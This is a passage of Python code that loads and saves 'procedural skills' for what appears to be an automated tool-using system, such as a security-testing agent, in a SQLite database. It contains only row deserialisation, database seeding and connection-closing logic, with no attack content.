    def _row_to_skill(row: sqlite3.Row) -> ProceduralSkill:
        """Deserialise a DB row into a ProceduralSkill."""
        raw_steps = json.loads(row["steps"])
        steps = [
            SkillStep(
                tool=s["tool"],
                input_template=s["input_template"],
                expected_pattern=s["expected_pattern"],
                fallback_tool=s.get("fallback_tool", ""),
                is_essential=s.get("is_essential", True),
            )
            for s in raw_steps
        ]
        return ProceduralSkill(
            skill_id=row["skill_id"],
            name=row["name"],
            technique_category=row["technique_category"],
            trigger_conditions=json.loads(row["trigger_conditions"]),
            steps=steps,
            success_rate=row["success_rate"],
            avg_severity=row["avg_severity"],
            times_used=row["times_used"],
            times_succeeded=row["times_succeeded"],
            last_used=row["last_used"],
            source_targets=json.loads(row["source_targets"]),
        )

    def _ensure_seed_skills(self) -> None:
        """Populate the DB with seed skills if it is empty."""
        count = self.conn.execute(
            "SELECT COUNT(*) FROM procedural_skills"
        ).fetchone()[0]
        if count == 0:
            for skill in _build_seed_skills():
                self._save_skill(skill)

    def close(self) -> None:
        """Close the database connection."""
        self.conn.close()
